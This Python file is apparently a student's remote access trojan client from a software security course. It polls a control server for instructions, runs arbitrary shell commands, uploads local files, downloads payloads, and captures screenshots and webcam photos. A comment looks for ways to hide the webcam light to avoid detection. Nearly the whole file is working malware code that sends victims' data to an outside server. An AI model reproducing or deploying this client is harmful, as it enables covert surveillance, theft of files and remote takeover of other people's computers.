# coding: gb18030

import time
import os
import subprocess
import platform
import shutil
import requests
import sys
import traceback
import threading
import uuid
from io import StringIO
import zipfile
import tempfile
import socket
import getpass

import cv2

if os.name == 'nt':
    from PIL import ImageGrab
else:
    import pyscreenshot as ImageGrab

import config


class Client(object):

    def __init__(self):
        self.platform = platform.system() + " " + platform.release()
        # self.uid = self.get_UID()
        self.hostname = socket.gethostname()
        # print({'platform': self.platform, 'hostname': self.hostname})

    def server_hello(self):
        """ Ask server for instructions """
        req = requests.post(config.SERVER + '/hello',
                            json={'platform': self.platform, 'hostname': self.hostname})
        #print(req.text)
        return req.text

    def send_output(self, output, command='', newlines=True):
        """ Send console output to server """
        if not isinstance(output, str):
            output = output.decode("gb18030")
            #print(output)
        req = requests.post(config.SERVER + '/report',
                            json={'output': output, 'cmd': command})

    def runcmd(self, cmd):
        """ Runs a shell command and returns its output """
        try:
            proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE)
            out, err = proc.communicate()
            output = (out + err)
            #print(output)
            self.send_output(output, cmd)
        except Exception as exc:
            self.send_output(traceback.format_exc())


    def expand_path(self, path):
        """ Expand environment variables and metacharacters in a path """
        return os.path.expandvars(os.path.expanduser(path))


    def upload(self, file):
        """ Uploads a local file to the server """
        print("file entity path:" + file)
        try:
            if os.path.exists(file) and os.path.isfile(file):
                self.send_output("[*] Uploading %s..." % file)
                requests.post(config.SERVER + '/upload',
                              files={'uploaded': open(file, 'rb')})
            else:
                pass
                self.send_output('[!] No such file: ' + file)
        except Exception as exc:
            print(traceback.format_exc())

    def download(self, file, destination):
        """ Downloads a file the the agent host through HTTP(S) """
        try:
           # destination = self.expand_path(destination)
            self.send_output("[*] Downloading %s..." % file)
            req = requests.get(file, stream=True)
            print(file)
            print(destination)
            tmp = file[8:].split('/')
            print(tmp)
            destination += '\\' + tmp[-1]
            print(destination)
            with open(destination, 'wb') as f:
                for chunk in req.iter_content(chunk_size=8000):
                    if chunk:
                        f.write(chunk)
            self.send_output("[+] File downloaded: " + destination)
        except Exception as exc:
            print(traceback.format_exc())
            self.send_output(traceback.format_exc())

    def screenshot(self):
        """ Takes a screenshot and uploads it to the server"""
        tmp_file = tempfile.NamedTemporaryFile()
        screenshot_file = tmp_file.name + ".png"

        if os.name != 'posix':
            screenshot = ImageGrab.grab()
            tmp_file.close()
            screenshot.save(screenshot_file)
        else:
            name = tmp_file.name + ".png"
            os.system("screencapture %s" % name)

        self.upload(screenshot_file)


    def camshot(self):
        # Notice: light of usage webcam gets turned on.
        # TODO: Find way to disable led-lamp or reduce amount of time.sleep as much as possible for less detection
        cam = cv2.VideoCapture(0)
        time.sleep(3)  # wait for camera to open up, so image isn't dark (less sleeping = darker image)
        ret, frame = cam.read()
        if not ret:
            return
        tmp_file = tempfile.NamedTemporaryFile()
        camshot_file = tmp_file.name + ".png"
        tmp_file.close()
        cv2.imwrite(camshot_file, frame)
        self.upload(camshot_file)

    def run(self):
        """ Main loop """
        while True:
            try:
                time.sleep(1)
                todo = self.server_hello()
                # Something to do ?
                if todo != "":
                    print(todo)
                    commandline = todo
                    self.send_output('$ ' + commandline)
                    split_cmd = commandline.split(" ")
                    command = split_cmd[0]
                    args = []
                    if len(split_cmd) > 1:
                        args = split_cmd[1:]

                    if command == 'upload':
                        self.upload(args[0])
                    elif command == 'download':
                        self.download(args[0], args[1])
                    elif command == 'screenshot':
                        self.screenshot()
                    elif command == 'camshot':
                        self.camshot()
                    else:
                        self.runcmd(commandline)
                    f = open('F:\\current_semester\\software_security\\shell\\remote-shell\\G11RC\\test.txt', 'w+')
                    f.write("")
                else:
                    pass
            except Exception as exc:
                print("command exec error")

    def test(self):
        req = requests.post(config.SERVER + '/test/',
                            json={'name': 'lzl', 'number':'0017'})
        return req

def main():
    agent = Client()
    agent.run()


if __name__ == "__main__":
    main()
